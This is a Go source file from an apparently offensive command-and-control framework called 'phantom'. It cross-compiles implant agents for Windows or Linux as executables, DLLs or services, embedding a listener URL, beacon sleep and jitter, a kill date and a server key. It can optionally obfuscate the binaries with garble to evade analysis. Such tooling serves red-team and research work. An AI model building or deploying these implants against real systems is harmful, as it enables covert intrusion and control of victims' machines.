package agent

import (
	"bytes"
	"crypto/rsa"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/phantom-c2/phantom/internal/crypto"
)

// BuildConfig holds the configuration for building an agent binary.
type BuildConfig struct {
	OS          string // "windows" or "linux"
	Arch        string // "amd64" or "arm64"
	BuildMode   string // "", "dll", "service"
	ListenerURL string
	Sleep       int
	Jitter      int
	KillDate    string // Optional: "2026-12-31"
	ServerPub   *rsa.PublicKey
	OutputDir   string
	Obfuscate   bool // Use garble
}

// BuildResult contains the output of a build operation.
type BuildResult struct {
	OutputPath string
	Size       int64
	OS         string
	Arch       string
}

// BuildAgent cross-compiles an agent binary with embedded configuration.
func BuildAgent(cfg BuildConfig) (*BuildResult, error) {
	// Validate
	if cfg.ListenerURL == "" {
		return nil, fmt.Errorf("listener URL is required")
	}
	if cfg.OS == "" {
		cfg.OS = runtime.GOOS
	}
	if cfg.Arch == "" {
		cfg.Arch = runtime.GOARCH
	}
	if cfg.Sleep <= 0 {
		cfg.Sleep = 10
	}
	if cfg.Jitter < 0 || cfg.Jitter > 50 {
		cfg.Jitter = 20
	}
	if cfg.OutputDir == "" {
		cfg.OutputDir = "build/agents"
	}

	// Ensure output directory exists
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		return nil, fmt.Errorf("create output dir: %w", err)
	}

	// Build output filename
	ext := ""
	if cfg.OS == "windows" {
		ext = ".exe"
	}
	if cfg.BuildMode == "dll" {
		ext = ".dll"
	}
	filename := fmt.Sprintf("phantom-agent_%s_%s%s", cfg.OS, cfg.Arch, ext)
	if cfg.BuildMode == "dll" {
		filename = fmt.Sprintf("phantom-agent_%s_%s.dll", cfg.OS, cfg.Arch)
	}
	if cfg.Obfuscate {
		filename = fmt.Sprintf("phantom-agent_%s_%s_garbled%s", cfg.OS, cfg.Arch, ext)
	}
	outputPath := filepath.Join(cfg.OutputDir, filename)

	// Encode server public key to base64 for embedding
	pubKeyB64 := ""
	if cfg.ServerPub != nil {
		keyBytes, err := crypto.PublicKeyToBytes(cfg.ServerPub)
		if err == nil {
			pubKeyB64 = crypto.Base64Encode(keyBytes)
		}
	}

	// Build ldflags
	module := "github.com/phantom-c2/phantom/internal/implant"
	ldflags := fmt.Sprintf("-s -w -X '%s.ListenerURL=%s' -X '%s.SleepSeconds=%d' -X '%s.JitterPercent=%d'",
		module, cfg.ListenerURL,
		module, cfg.Sleep,
		module, cfg.Jitter,
	)

	if cfg.KillDate != "" {
		ldflags += fmt.Sprintf(" -X '%s.KillDate=%s'", module, cfg.KillDate)
	}
	if pubKeyB64 != "" {
		ldflags += fmt.Sprintf(" -X '%s.ServerPubKey=%s'", module, pubKeyB64)
	}

	// Build environment
	env := os.Environ()
	env = setEnv(env, "GOOS", cfg.OS)
	env = setEnv(env, "GOARCH", cfg.Arch)

	// Determine build command
	var cmd *exec.Cmd
	if cfg.BuildMode == "dll" {
		// DLL requires CGO + mingw cross-compiler
		env = setEnv(env, "CGO_ENABLED", "1")
		if cfg.OS == "windows" {
			env = setEnv(env, "CC", "x86_64-w64-mingw32-gcc")
		}
		cmd = exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent-dll")
	} else if cfg.Obfuscate {
		env = setEnv(env, "CGO_ENABLED", "0")
		// Use garble for obfuscation
		garblePath, err := exec.LookPath("garble")
		if err != nil {
			return nil, fmt.Errorf("garble not found — install with: go install mvdan.cc/garble@latest")
		}
		cmd = exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
			"build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
	} else {
		env = setEnv(env, "CGO_ENABLED", "0")
		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
	}

	cmd.Env = env

	// Find project root (where go.mod lives)
	projectRoot, err := findProjectRoot()
	if err != nil {
		return nil, fmt.Errorf("find project root: %w", err)
	}
	cmd.Dir = projectRoot

	// Capture output
	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("build failed: %s\n%s", err, stderr.String())
	}

	// Get file size
	info, err := os.Stat(outputPath)
	if err != nil {
		return nil, fmt.Errorf("stat output: %w", err)
	}

	return &BuildResult{
		OutputPath: outputPath,
		Size:       info.Size(),
		OS:         cfg.OS,
		Arch:       cfg.Arch,
	}, nil
}

// findProjectRoot walks up directories to find go.mod.
func findProjectRoot() (string, error) {
	// Try current directory first
	dir, err := os.Getwd()
	if err != nil {
		return "", err
	}

	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}

		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}

	// Try the binary's directory
	exe, err := os.Executable()
	if err == nil {
		dir = filepath.Dir(exe)
		for {
			if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
				return dir, nil
			}
			parent := filepath.Dir(dir)
			if parent == dir {
				break
			}
			dir = parent
		}
	}

	return "", fmt.Errorf("cannot find go.mod — run from the project directory")
}

// setEnv sets or replaces an environment variable.
func setEnv(env []string, key, value string) []string {
	prefix := key + "="
	for i, e := range env {
		if strings.HasPrefix(e, prefix) {
			env[i] = prefix + value
			return env
		}
	}
	return append(env, prefix+value)
}

// FormatSize formats bytes into human-readable size.
func FormatSize(bytes int64) string {
	const (
		KB = 1024
		MB = KB * 1024
	)
	switch {
	case bytes >= MB:
		return fmt.Sprintf("%.1f MB", float64(bytes)/float64(MB))
	case bytes >= KB:
		return fmt.Sprintf("%.1f KB", float64(bytes)/float64(KB))
	default:
		return fmt.Sprintf("%d B", bytes)
	}
}
